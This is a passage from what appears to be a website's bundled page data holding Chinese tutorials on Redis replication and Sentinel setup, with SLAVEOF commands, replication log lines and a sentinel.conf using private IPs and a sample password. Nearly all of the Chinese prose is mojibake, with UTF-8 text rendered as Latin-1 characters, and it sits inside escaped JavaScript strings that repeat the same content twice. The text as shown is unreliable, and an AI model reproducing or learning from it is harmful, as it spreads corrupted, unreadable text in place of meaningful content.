æå¡å¨ä¸çæ°æ®ä¹è¢«æ¸ç©ºï¼\n\n> å¼ºçå»ºè®®å¨ master åå¨ slave ä¸­å¯ç¨æä¹åãå¦åä¼æå¦ä¸é®é¢ï¼\n> æä»¬è®¾ç½®èç¹ A ä¸º master å¹¶å³é­å®çæä¹åè®¾ç½®ï¼slave B å C ä» èç¹ A å¤å¶æ°æ®ãèç¹ A å´©æºï¼ä½æ¯ä»æä¸äºèªå¨éå¯çç³»ç»å¯ä»¥éå¯è¿ç¨ãä½æ¯ç±äºæä¹åè¢«å³é­äºï¼èç¹éå¯åå¶æ°æ®éåä¸ºç©ºãèç¹ B å èç¹ C ä¼ä»èç¹ A å¤å¶æ°æ®ï¼ä½æ¯èç¹ A çæ°æ®éæ¯ç©ºçï¼å æ­¤å¤å¶çç»ææ¯å®ä»¬ä¼éæ¯èªèº«ä¹åçæ°æ®å¯æ¬ã\n> å½ Redis Sentinel è¢«ç¨äºé«å¯ç¨å¹¶ä¸ master å³é­æä¹åï¼è¿æ¶å¦æåè®¸èªå¨éå¯è¿ç¨ä¹æ¯å¾å±é©çãä¾å¦ï¼ master å¯ä»¥éå¯çè¶³å¤å¿«ä»¥è´äº Sentinel æ²¡ææ¢æµå°æéï¼å æ­¤ä¸è¿°çæéæ¨¡å¼ä¹ä¼åçã\n\n\n# å·¥ä½æ¨¡å¼\n\nRedis ä¸ç®¡æ¯æ§çè¿æ¯æ°çï¼å¤å¶çå®ç°é½å¯ä»¥åä¸ºä¸ä¸ªæ­¥éª¤ï¼\n\n\n\n\n# 1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£\n\n127.0.0.1:12345> SLAVEOF 127.0.0.1 6379\n\n\n1\n\n\nå½å®¢æ·ç«¯å slave å¨åéä»¥ä¸å½ä»¤æ¶æèå¨éç½®æä»¶ä¸­éç½® slaveof éé¡¹ãslave å°ååé SLAVEOF å½ä»¤ç å®¢æ·ç«¯ è¿å OKï¼è¡¨ç¤ºå¤å¶æä»¤å·²ç»è¢«æ¥æ¶ï¼èå®éä¸å¤å¶å·¥ä½æ¯å¨ OK è¿åä¹åè¿è¡ã\n\n\n# 2. å»ºç«å¥æ¥å­è¿æ¥\n\n\n\nslave å¨æ ¹æ®è®¾ç½®çå¥æ¥å­åå»ºè¿å master çå¥æ¥å­è¿æ¥ã master æ¥æ¶ slave å¨çå¥æ¥å­è¿æ¥ä¹åï¼ä¸ºè¯¥å¥æ¥å­åå»ºååºçå®¢æ·ç«¯ç¶æï¼å¹¶å°æ­¤æ¶ç slave å¨çåæ¯ master çå®¢æ·ç«¯ï¼ä¹å°±æ¯è¯¥ slave å¨åæ¶å·å¤æå¡å¨ä¸å®¢æ·ç«¯ä¸¤ä¸ªèº«ä»½ã\n\n\n# 3. åé PING å½ä»¤\n\n\n\nslave æä¸º master çå®¢æ·ç«¯ä¹åï¼åçç¬¬ä¸ä»¶äºå°±æ¯å master åé PING å½ä»¤ãPING å½ä»¤ä¸»è¦æä¸¤ç§ä½ç¨ï¼\n\n * è½ç¶å»ºç«äºå¥æ¥å­è¿æ¥ï¼ä½æ¯è¿æªä½¿ç¨è¿ï¼éè¿åé PING å½ä»¤æ£æ¥å¥æ¥å­çè¯»åç¶ææ¯å¦æ­£å¸¸\n * éè¿åé PING å½ä»¤æ£æ¥ master è½å¦æ­£å¸¸å¤çå½ä»¤è¯·æ±\n\nslave å¨åé PING å½ä»¤ä¹åå°éå°ä»¥ä¸ä¸ç§æåµçå¶ä¸­ä¸ç§ï¼\n\n * master å slave è¿åä¸ä¸ªåå¤ï¼ä½æ¯ slave å´ä¸è½å¨è§å®çä¼æ¶é´ï¼timeoutï¼åè¯»åå½ä»¤åå¤çåå®¹ï¼åè¡¨ç¤ºå½åä¸» slave ä¹é´çç½ç»ç¶æè¿æ¥ä¸ä½³ï¼ä¸è½åºç¡æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * master å slave è¿åä¸ä¸ªéè¯¯ï¼é£ä¹è¡¨ç¤º master ææ¶æ²¡æåæ³å¤ç slave å¨çå½ä»¤è¯·æ±ï¼ä¸è½ç»§ç»­æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * å¦æ slave è¯»åå° âPONGâ åå¤ï¼é£ä¹è¡¨ç¤ºä¸»ä»ä¹é´ç½ç»è¿æ¥æ­£å¸¸ï¼å¹¶ä¸ master å¯ä»¥å¤ç slave åéçå½ä»¤è¯·æ±ã\n\n\n# 4. èº«ä»½éªè¯\n\nslave æ¥æ¶å° master è¿åç âPONGâ åå¤ï¼æ¥ä¸æ¥å°±éè¦èèèº«ä»½éªè¯çäºã\n\n\n\nå¦æ slave è®¾ç½®äº masterauth éé¡¹ï¼é£ä¹è¿è¡èº«ä»½éªè¯\nå¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼é£ä¹ä¸è¿è¡èº«ä»½éªè¯\nslave å¨èº«ä»½éªè¯çæ¶åå¯è½éå°ä¸ç§æåµ\n\n * ä¸»æå¡æ²¡æè®¾ç½® requirepass éé¡¹ï¼å¹¶ä¸ slave ä¹æ²¡æè®¾ç½® masterquth éé¡¹ï¼é£ä¹ master ç»§ç»­æ§è¡ slave å½ä»¤ï¼å®æå¤å¶å·¥ä½\n * å¦æ slave éè¿ AUTH å½ä»¤åéçå¯ç ä¸ master ä¸­ requirepass å¯ç ç¸åï¼é£ä¹ master å°ç»§ç»­æ§è¡ slave åéçå½ä»¤ï¼å¤å¶å·¥ä½ç»§ç»­ï¼ä¸æ­¤ç¸åï¼å¯ç ä¸ä¸è´ï¼åä¼è¿å invalid password éè¯¯\n * å¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼è master è®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ master å°è¿åä¸ä¸ª NOAUTH éè¯¯ãåä¹æ²¡æè®¾è®¾ç½® masterauth éé¡¹ï¼èè®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ä¼è¿å no password is set éè¯¯ã\n\n\n# 5. åéç«¯å£ä¿¡æ¯\n\nå¨èº«ä»½éªè¯æ­¥éª¤ä¹åï¼slave å°æ§è¡å½ä»¤ REPLCONF listening-port <port> ï¼å master åé slave ççå¬ç«¯å£å·ã\n\n\n# 6. åæ­¥ 7. å½ä»¤ä¼ æ­\n\nslave å master åé PSYNC å½ä»¤ï¼æ§è¡åæ­¥æä½ï¼å¼å¾æ³¨æçæ¯åªæ slave æ¯ master çå®¢æ·ç«¯ï¼ä½æ¯æ§è¡åæ­¥æä½ä¹åï¼master ä¹ä¼æä¸º slave çå®¢æ·ç«¯ã\n\nMASTER                                            SLAVE                             å¤æ³¨\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            ä¸»ä»é½å¯å¨ï¼å¹¶å®æåæ­¥\nset k1,v1                                         set k1,v1                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\nset k2,v2                                         set k2,v2                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\n......                                            ......                            æ´å¤çæä½\nä¸»ä»æ­å¼è¿æ¥                                            ä¸»ä»æ­å¼è¿æ¥                            slave æéåæ­¢äºåæ­¥æä½\nset k5002,v5002                                                                     slave å°è¯éæ°è¿æ¥\nset k5003,v5003                                                                     slave å°è¯éæ°è¿æ¥\nä¸»ä»éè¿æ¥æå                                           ä¸»ä»éè¿æ¥æå                           ä¸»ä»éè¿æ¥æå\n                                                  PSYNC                             è¿æ¥æåï¼slave å master åé PSYNC å½ä»¤ï¼æ§è¡åæ­¥ï¼ä»¥ä¸ç¬¬ 6 æ­¥\nå slave è¿å + CONTINUEï¼å¹¶æ§è¡åæ­¥                                                         \n                                                  æ¥æ¶ + CONTINUE                     slave æ¥æ¶ + CONTINUEï¼åå¤æ§è¡é¨ååæ­¥\nå slave åé set k5002,v5002 å set k5003,v5003 å½ä»¤                                     \n                                                  set k5002,v5002 set k5003,v5003   ä»æ¥æ¶å°å½ä»¤å¹¶æ§è¡\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            åæ­¥å®æ\n\n> é«çæ¬ç Redis slave é»è®¤ä¸ºåªè¯»ã",normalizedContent:"redis é«å¯ç¨ä¸»è¦æ¯ä½¿ç¨ ä¸»ä»å¤å¶ å å¨åµæ¥åï¼éç¾¤ä¸è½ç®æ¯é«å¯ç¨ï¼å ä¸ºå½èç¹ b æå¤§éçæ°æ®ï¼å¦æèç¹ b ææï¼å°±åæ æ³è®¿é®å°èç¹ b çæ°æ®ï¼å ä¸ºå¶ä»èç¹å¹¶ä¸ä¼æèç¹ b çæ°æ®ãå¶ä¸­çåå è·æ¬èº« redis çè®¾è®¡æå³ã\n\n\n# å¤å¶\n\nä½¿ç¨åéç½®ä¸»ä»å¤å¶éå¸¸ç®åï¼ä» redis æå¡å¨ï¼ä¸æç§° slaveï¼è½ç²¾ç¡®å¾å¤å¶ä¸» redis æå¡å¨ï¼ä¸æç§° masterï¼çåå®¹ãæ¯æ¬¡å½ slave å master ä¹é´çè¿æ¥æ­å¼æ¶ï¼ slave ä¼èªå¨éè¿å° master ä¸ï¼å¹¶ä¸æ è®ºè¿æé´ master åçäºä»ä¹ï¼ slave é½å°å°è¯è®©èªèº«æä¸º master çç²¾ç¡®å¯æ¬ã\nè¿ä¸ªç³»ç»çè¿è¡ä¾é ä¸ä¸ªä¸»è¦çæºå¶ï¼\n\n * å½ä¸ä¸ª master å®ä¾åä¸ä¸ª slave å®ä¾è¿æ¥æ­£å¸¸æ¶ï¼ master ä¼åéä¸è¿ä¸²çå½ä»¤æµæ¥ä¿æå¯¹ slave çæ´æ°ï¼ä»¥ä¾¿äºå°èªèº«æ°æ®éçæ¹åå¤å¶ç» slave ï¼åæ¬å®¢æ·ç«¯çåå¥ãkey çè¿ææè¢«éåºç­ç­ (å¢é)ã\n * å½ master å slave ä¹é´çè¿æ¥æ­å¼ä¹åï¼å ä¸ºç½ç»é®é¢ãæèæ¯ä¸»ä»æè¯å°è¿æ¥è¶æ¶ï¼ slave éæ°è¿æ¥ä¸ master å¹¶ä¼å°è¯è¿è¡é¨åéåæ­¥ï¼è¿æå³çå®ä¼å°è¯åªè·åå¨æ­å¼è¿æ¥æé´åä¸¢å¤±çå½ä»¤ã\n * å½æ æ³è¿è¡é¨åéåæ­¥æ¶ï¼ slave ä¼è¯·æ±è¿è¡å¨ééåæ­¥ãè¿ä¼æ¶åå°ä¸ä¸ªæ´å¤æçè¿ç¨ï¼ä¾å¦ master éè¦åå»ºæææ°æ®çå¿«ç§ï¼å°ä¹åéç» slave ï¼ä¹åå¨æ°æ®éæ´æ¹æ¶æç»­åéå½ä»¤å° slave ã\n\nredis é»è®¤ä½¿ç¨å¼æ­¥å¤å¶ï¼å¶ç¹ç¹æ¯ä½å»¶è¿åé«æ§è½ãslave æå¡ä¼å¼æ­¥å°ç¡®è®¤å¶ä» master æå¡å¨å¨ææ¥æ¶å°çæ°æ®éã\n\nredis å¤å¶çéå¸¸éè¦çäºå®ï¼\n\n * redis ä½¿ç¨å¼æ­¥å¤å¶ï¼slave å master ä¹é´å¼æ­¥ç¡®è®¤å¤çæ°æ®ã\n * ä¸ä¸ª master å¯ä»¥æ¥æå¤ä¸ª slave\n * slave å¯ä»¥æ¥åå¶ä» slave çè¿æ¥ãé¤äºå¤ä¸ª slave å¯ä»¥è¿æ¥å°åä¸ä¸ª master ä¹å¤ï¼ slave ä¹é´ä¹å¯ä»¥åå±å ç¶çç»æè¿æ¥å°å¶ä» slave ãèª redis 4.0 èµ·ï¼ææç sub-slave å°ä¼ä» master æ¶å°å®å¨ä¸æ ·çå¤å¶æµã\n\n\n\n * redis å¤å¶å¨ master æ¯éé»å¡çãè¿æå³ç master å¨ä¸ä¸ªæå¤ä¸ª slave è¿è¡åæ¬¡åæ­¥æèæ¯é¨åéåæ­¥æ¶ï¼å¯ä»¥ç»§ç»­å¤çæ¥è¯¢è¯·æ±ã\n * ä¸»ä»å¤å¶å¯¹äº slave æå¡å¨æ¥è¯´ä¹æ¯éé»å¡çï¼è¿æå³çï¼å³ä½¿ä» redis å¨è¿è¡ä¸»ä»å¤å¶è¿ç¨ä¸­ä¹å¯ä»¥æ¥åå¤ççæ¥è¯¢è¯·æ±ï¼åªä¸è¿è¿æ¶å slave è¿åçæ¯ä»¥åèçæ°æ®ï¼å¦æä½ ä¸æ³è¿æ ·ï¼é£ä¹å¨å¯å¨ redis æ¶ï¼å¯ä»¥å¨éç½®æä»¶ä¸­è¿è¡è®¾ç½®ï¼é£ä¹ slave å¨å¤å¶åæ­¥è¿ç¨ä¸­æ¥èªå¤ççæ¥è¯¢è¯·æ±é½ä¼è¿åéè¯¯ç»å®¢æ·ç«¯ï¼ï¼è½ç¶è¯´ä¸»ä»å¤å¶è¿ç¨ä¸­å¯¹äº slave æ¯éé»å¡çï¼ä½æ¯å½ slave ä» master åæ­¥è¿æ¥ææ°çæ°æ®åè¿éè¦å°æ°æ°æ®å è½½å°åå­ä¸­ï¼å¨å è½½å°åå­çè¿ç¨ä¸­æ¯é»å¡çï¼å¨è¿æ®µæ¶é´åçè¯·æ±å°ä¼è¢«é»ï¼ä½æ¯å³ä½¿å¯¹äºå¤§æ°æ®éï¼å è½½å°åå­çæ¶é´ä¹æ¯æ¯è¾å¤çï¼\n * ä¸»ä»å¤å¶æé«äº redis æå¡çæ©å±æ§ï¼é¿ååä¸ª redis æå¡å¨çè¯»åè®¿é®ååè¿å¤§çé®é¢ï¼åæ¶ä¹å¯ä»¥ç»ä¸ºæ°æ®å¤ä»½ååä½æä¾ä¸ç§è§£å³æ¹æ¡ï¼\n * ä¸ºäºé¿å master æå¡å¨åç£çååå¸¦æ¥çå¼éï¼å¯ä»¥éç½®è®© master ä¸å¨å°æ°æ®æä¹åå°ç£çï¼èæ¯éè¿è¿æ¥è®©ä¸ä¸ªéç½®ç slave æå¡å¨åæ¶çå°ç¸å³æ°æ®æä¹åå°ç£çï¼ä¸è¿è¿æ ·ä¼å­å¨ä¸ä¸ªé®é¢ï¼å°±æ¯ master æå¡å¨ä¸æ¦éå¯ï¼å ä¸º master æå¡å¨æ°æ®ä¸ºç©ºï¼è¿æ¶åéè¿ä¸»ä»åæ­¥å¯è½å¯¼è´ä» slave æå¡å¨ä¸çæ°æ®ä¹è¢«æ¸ç©ºï¼\n\n> å¼ºçå»ºè®®å¨ master åå¨ slave ä¸­å¯ç¨æä¹åãå¦åä¼æå¦ä¸é®é¢ï¼\n> æä»¬è®¾ç½®èç¹ a ä¸º master å¹¶å³é­å®çæä¹åè®¾ç½®ï¼slave b å c ä» èç¹ a å¤å¶æ°æ®ãèç¹ a å´©æºï¼ä½æ¯ä»æä¸äºèªå¨éå¯çç³»ç»å¯ä»¥éå¯è¿ç¨ãä½æ¯ç±äºæä¹åè¢«å³é­äºï¼èç¹éå¯åå¶æ°æ®éåä¸ºç©ºãèç¹ b å èç¹ c ä¼ä»èç¹ a å¤å¶æ°æ®ï¼ä½æ¯èç¹ a çæ°æ®éæ¯ç©ºçï¼å æ­¤å¤å¶çç»ææ¯å®ä»¬ä¼éæ¯èªèº«ä¹åçæ°æ®å¯æ¬ã\n> å½ redis sentinel è¢«ç¨äºé«å¯ç¨å¹¶ä¸ master å³é­æä¹åï¼è¿æ¶å¦æåè®¸èªå¨éå¯è¿ç¨ä¹æ¯å¾å±é©çãä¾å¦ï¼ master å¯ä»¥éå¯çè¶³å¤å¿«ä»¥è´äº sentinel æ²¡ææ¢æµå°æéï¼å æ­¤ä¸è¿°çæéæ¨¡å¼ä¹ä¼åçã\n\n\n# å·¥ä½æ¨¡å¼\n\nredis ä¸ç®¡æ¯æ§çè¿æ¯æ°çï¼å¤å¶çå®ç°é½å¯ä»¥åä¸ºä¸ä¸ªæ­¥éª¤ï¼\n\n\n\n\n# 1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£\n\n127.0.0.1:12345> slaveof 127.0.0.1 6379\n\n\n1\n\n\nå½å®¢æ·ç«¯å slave å¨åéä»¥ä¸å½ä»¤æ¶æèå¨éç½®æä»¶ä¸­éç½® slaveof éé¡¹ãslave å°ååé slaveof å½ä»¤ç å®¢æ·ç«¯ è¿å okï¼è¡¨ç¤ºå¤å¶æä»¤å·²ç»è¢«æ¥æ¶ï¼èå®éä¸å¤å¶å·¥ä½æ¯å¨ ok è¿åä¹åè¿è¡ã\n\n\n# 2. å»ºç«å¥æ¥å­è¿æ¥\n\n\n\nslave å¨æ ¹æ®è®¾ç½®çå¥æ¥å­åå»ºè¿å master çå¥æ¥å­è¿æ¥ã master æ¥æ¶ slave å¨çå¥æ¥å­è¿æ¥ä¹åï¼ä¸ºè¯¥å¥æ¥å­åå»ºååºçå®¢æ·ç«¯ç¶æï¼å¹¶å°æ­¤æ¶ç slave å¨çåæ¯ master çå®¢æ·ç«¯ï¼ä¹å°±æ¯è¯¥ slave å¨åæ¶å·å¤æå¡å¨ä¸å®¢æ·ç«¯ä¸¤ä¸ªèº«ä»½ã\n\n\n# 3. åé ping å½ä»¤\n\n\n\nslave æä¸º master çå®¢æ·ç«¯ä¹åï¼åçç¬¬ä¸ä»¶äºå°±æ¯å master åé ping å½ä»¤ãping å½ä»¤ä¸»è¦æä¸¤ç§ä½ç¨ï¼\n\n * è½ç¶å»ºç«äºå¥æ¥å­è¿æ¥ï¼ä½æ¯è¿æªä½¿ç¨è¿ï¼éè¿åé ping å½ä»¤æ£æ¥å¥æ¥å­çè¯»åç¶ææ¯å¦æ­£å¸¸\n * éè¿åé ping å½ä»¤æ£æ¥ master è½å¦æ­£å¸¸å¤çå½ä»¤è¯·æ±\n\nslave å¨åé ping å½ä»¤ä¹åå°éå°ä»¥ä¸ä¸ç§æåµçå¶ä¸­ä¸ç§ï¼\n\n * master å slave è¿åä¸ä¸ªåå¤ï¼ä½æ¯ slave å´ä¸è½å¨è§å®çä¼æ¶é´ï¼timeoutï¼åè¯»åå½ä»¤åå¤çåå®¹ï¼åè¡¨ç¤ºå½åä¸» slave ä¹é´çç½ç»ç¶æè¿æ¥ä¸ä½³ï¼ä¸è½åºç¡æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * master å slave è¿åä¸ä¸ªéè¯¯ï¼é£ä¹è¡¨ç¤º master ææ¶æ²¡æåæ³å¤ç slave å¨çå½ä»¤è¯·æ±ï¼ä¸è½ç»§ç»­æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * å¦æ slave è¯»åå° âpongâ åå¤ï¼é£ä¹è¡¨ç¤ºä¸»ä»ä¹é´ç½ç»è¿æ¥æ­£å¸¸ï¼å¹¶ä¸ master å¯ä»¥å¤ç slave åéçå½ä»¤è¯·æ±ã\n\n\n# 4. èº«ä»½éªè¯\n\nslave æ¥æ¶å° master è¿åç âpongâ åå¤ï¼æ¥ä¸æ¥å°±éè¦èèèº«ä»½éªè¯çäºã\n\n\n\nå¦æ slave è®¾ç½®äº masterauth éé¡¹ï¼é£ä¹è¿è¡èº«ä»½éªè¯\nå¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼é£ä¹ä¸è¿è¡èº«ä»½éªè¯\nslave å¨èº«ä»½éªè¯çæ¶åå¯è½éå°ä¸ç§æåµ\n\n * ä¸»æå¡æ²¡æè®¾ç½® requirepass éé¡¹ï¼å¹¶ä¸ slave ä¹æ²¡æè®¾ç½® masterquth éé¡¹ï¼é£ä¹ master ç»§ç»­æ§è¡ slave å½ä»¤ï¼å®æå¤å¶å·¥ä½\n * å¦æ slave éè¿ auth å½ä»¤åéçå¯ç ä¸ master ä¸­ requirepass å¯ç ç¸åï¼é£ä¹ master å°ç»§ç»­æ§è¡ slave åéçå½ä»¤ï¼å¤å¶å·¥ä½ç»§ç»­ï¼ä¸æ­¤ç¸åï¼å¯ç ä¸ä¸è´ï¼åä¼è¿å invalid password éè¯¯\n * å¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼è master è®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ master å°è¿åä¸ä¸ª noauth éè¯¯ãåä¹æ²¡æè®¾è®¾ç½® masterauth éé¡¹ï¼èè®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ä¼è¿å no password is set éè¯¯ã\n\n\n# 5. åéç«¯å£ä¿¡æ¯\n\nå¨èº«ä»½éªè¯æ­¥éª¤ä¹åï¼slave å°æ§è¡å½ä»¤ replconf listening-port <port> ï¼å master åé slave ççå¬ç«¯å£å·ã\n\n\n# 6. åæ­¥ 7. å½ä»¤ä¼ æ­\n\nslave å master åé psync å½ä»¤ï¼æ§è¡åæ­¥æä½ï¼å¼å¾æ³¨æçæ¯åªæ slave æ¯ master çå®¢æ·ç«¯ï¼ä½æ¯æ§è¡åæ­¥æä½ä¹åï¼master ä¹ä¼æä¸º slave çå®¢æ·ç«¯ã\n\nmaster                                            slave                             å¤æ³¨\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            ä¸»ä»é½å¯å¨ï¼å¹¶å®æåæ­¥\nset k1,v1                                         set k1,v1                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\nset k2,v2                                         set k2,v2                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\n......                                            ......                            æ´å¤çæä½\nä¸»ä»æ­å¼è¿æ¥                                            ä¸»ä»æ­å¼è¿æ¥                            slave æéåæ­¢äºåæ­¥æä½\nset k5002,v5002                                                                     slave å°è¯éæ°è¿æ¥\nset k5003,v5003                                                                     slave å°è¯éæ°è¿æ¥\nä¸»ä»éè¿æ¥æå                                           ä¸»ä»éè¿æ¥æå                           ä¸»ä»éè¿æ¥æå\n                                                  psync                             è¿æ¥æåï¼slave å master åé psync å½ä»¤ï¼æ§è¡åæ­¥ï¼ä»¥ä¸ç¬¬ 6 æ­¥\nå slave è¿å + continueï¼å¹¶æ§è¡åæ­¥                                                         \n                                                  æ¥æ¶ + continue                     slave æ¥æ¶ + continueï¼åå¤æ§è¡é¨ååæ­¥\nå slave åé set k5002,v5002 å set k5003,v5003 å½ä»¤                                     \n                                                  set k5002,v5002 set k5003,v5003   ä»æ¥æ¶å°å½ä»¤å¹¶æ§è¡\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            åæ­¥å®æ\n\n> é«çæ¬ç redis slave é»è®¤ä¸ºåªè¯»ã",charsets:{cjk:!0}},{title:"Redisé«å¯ç¨(ä¸) æ­å»º",frontmatter:{title:"Redisé«å¯ç¨(ä¸) æ­å»º",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1609",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1609.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%B8%89)%20%E6%90%AD%E5%BB%BA.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1609.Redisé«å¯ç¨(ä¸) æ­å»º.md",key:"v-4a58f399",path:"/Redis/1609/",headers:[{level:2,title:"ç¯å¢",slug:"ç¯å¢",normalizedTitle:"ç¯å¢",charIndex:2},{level:2,title:"ä¸»ä»æ­å»º",slug:"ä¸»ä»æ­å»º",normalizedTitle:"ä¸»ä»æ­å»º",charIndex:231},{level:2,title:"å¨åµ",slug:"å¨åµ",normalizedTitle:"å¨åµ",charIndex:794},{level:3,title:"å¨åµå¯å¨",slug:"å¨åµå¯å¨",normalizedTitle:"å¨åµå¯å¨",charIndex:2443},{level:2,title:"spring boot redis å¨åµ",slug:"spring-boot-redis-å¨åµ",normalizedTitle:"spring boot redis å¨åµ",charIndex:2599}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ç¯å¢ ä¸»ä»æ­å»º å¨åµ å¨åµå¯å¨ spring boot redis å¨åµ",content:'# ç¯å¢\n\nèèå°æ¢ç¶æ¯é«å¯ç¨ï¼é£ä¹ Sentinel ä¹å¾æ¯ä¸ä¸ªä»¥ä¸ã\n\nIP               PORT    é¨ç½²\n192.168.81.101   6379    Redis6 master\n192.168.81.101   26379   Redis6 Sentinel\n192.168.81.102   6379    Redis6 slave\n192.168.81.102   26379   Redis6 Sentinel\n\n\n\n\n# ä¸»ä»æ­å»º\n\nä¸ºäºä¸»ä» Redis å®å¨ï¼å¯ç æ¯å¿é¡»è®¾ç½®çï¼å¦åç­çè¢«æç¿å§ãå¨éç½®æä»¶ä¿®æ¹å¦ä¸ï¼\nä¸»ä»å¯ç å¯ä»¥ä¸æ ·ï¼æ¹ä¾¿è®°å¿ã\n\nrequirepass ilovejj\n\n\n1\n\n\nè®¾ç½®è¿æ¥ master æ¶çè®¤è¯å¯ç ï¼ä¸æ¬ç» slave çéç½®æä»¶è®¾ç½®\n\nmasterauth ilovejj\n\n\n1\n\n\né½å¯å¨æåä¹åå¨ slave ä½¿ç¨ä»¥ä¸å½ä»¤\n\n127.0.0.1:6379> slaveof 192.168.81.111 6379\nOK\n\n\n1\n2\n\n\nå¯ä»¥ä»æ¥å¿éé¢çå°æ¯å¦å¯å¨æåï¼å¦ææ²¡æå¯å¨æååä¼ä¸ç´æå°å¦ä¸ï¼æè¿éææå¼ä¸ä¸ªéè¯¯ç IP å ä»¥è¯´æã\n\n2187:S 16 Nov 2020 17:19:17.913 # Error condition on socket for SYNC: Operation now in progress\n2187:S 16 Nov 2020 17:19:18.526 * Connecting to MASTER 192.168.81.111:6379\n2187:S 16 Nov 2020 17:19:18.526 * MASTER <-> REPLICA sync started\n\n\n1\n2\n3\n\n\n> ä¸å®è¦è®°å¾å æ¥å¿ï¼å¦åä»¥åæä¹æ­»çé½ä¸ç¥éã\n\n\n# å¨åµ\n\nå¨ Redis ç®å½ä¸ï¼èªå¸¦çä¸ä¸ª sentinel.cnf æä»¶ï¼æçç¸å³ sentinel éç½®ï¼æä»¬ä¿®æ¹å¦ä¸ï¼\n\n# ç«¯å£é»è®¤\nport 26379\ndaemonize yes\nlogfile "/opt/module/redis-6.0.8/log/sentinel.log"\nsentinel monitor mymaster 192.168.81.101 6379 2\nsentinel down-after-milliseconds mymaster 60000\nsentinel failover-timeout mymaster 180000\nsentinel parallel-syncs mymaster 1\nsentinel auth-pass mymaster ilovejj\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> åè®°å¨åµï¼ä¸å®è¦ç¨çæ¯ master ç IPï¼åªæå¨åä¸å°æå¡å¨ä¸ï¼ä¹è¦ä½¿ç¨ IPï¼ä¸è¦ä½¿ç¨ 127.0.0.1ï¼å¦åææä¸å°å¨åµï¼salve å¯è½æ æ³å¤å¶ã\n\n * daemonize yes é»è®¤ no\n   é»è®¤æ¯ noï¼æ¹ä¸º yes è®©å¨åå°è¿è¡\n\n * logfile "/opt/module/redis-6.0.8/log/sentinel.log"\n   é»è®¤ä¸è¾åºæ¥å¿ï¼ä¸å®è¦éç½®æ¥å¿ï¼å¦å...\n\n * sentinel monitor mymaster 192.168.81.101 6379 2\n   çè§ä¸ä¸ªåä¸º mymaster çä¸»æå¡å¨ï¼ è¿ä¸ªä¸»æå¡å¨ç IP å°åä¸º 192.168.81.101 ï¼ ç«¯å£å·ä¸º 6379 ï¼ èå°è¿ä¸ªä¸»æå¡å¨å¤æ­ä¸ºå¤±æè³å°éè¦ 2 ä¸ª Sentinel åæãè¿éç mymaster åªæ¯ä¸ä¸ªå¿åï¼ä¾ä»¥ä¸éç½®ä½¿ç¨ã\n\n * sentinel down-after-milliseconds mymaster 60000 é»è®¤ 30000ms\n   å¦ææå¡å¨å¨ç»å®çæ¯«ç§æ°ä¹åï¼ æ²¡æè¿å Sentinel åéç PING å½ä»¤çåå¤ï¼ æèè¿åä¸ä¸ªéè¯¯ï¼ é£ä¹ Sentinel å°è¿ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ï¼subjectively downï¼ç®ç§° SDOWN ï¼ã\n   ä¸è¿åªæä¸ä¸ª Sentinel å°æå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿å¹¶ä¸ä¸å®ä¼å¼èµ·æå¡å¨çèªå¨æéè¿ç§»ï¼ åªæå¨è¶³å¤æ°éç Sentinel é½å°ä¸ä¸ªæå¡å¨æ è®°ä¸ºä¸»è§ä¸çº¿ä¹åï¼ æå¡å¨æä¼è¢«æ è®°ä¸ºå®¢è§ä¸çº¿ï¼objectively downï¼ ç®ç§° ODOWN ï¼ï¼ è¿æ¶èªå¨æéè¿ç§»æä¼æ§è¡ã\n   å°æå¡å¨æ è®°ä¸ºå®¢è§ä¸çº¿æéç Sentinel æ°éç±å¯¹ä¸»æå¡å¨çéç½®å³å®ã\n\n * sentinel failover-timeout mymaster 180000 é»è®¤ 180000ms\n   æéè½¬ç§»æ¶é´\n\n * sentinel parallel-syncs mymaster 1 é»è®¤ 1\n   å¨æ§è¡æéè½¬ç§»æ¶ï¼ æå¤å¯ä»¥æå¤å°ä¸ªä»æå¡å¨åæ¶å¯¹æ°çä¸»æå¡å¨è¿è¡åæ­¥ï¼ è¿ä¸ªæ°å­è¶å°ï¼ å®ææéè½¬ç§»æéçæ¶é´å°±è¶é¿ã\n   å¦æä»æå¡å¨è¢«è®¾ç½®ä¸ºåè®¸ä½¿ç¨è¿ææ°æ®éï¼åè§å¯¹ redis.conf æä»¶ä¸­å¯¹ 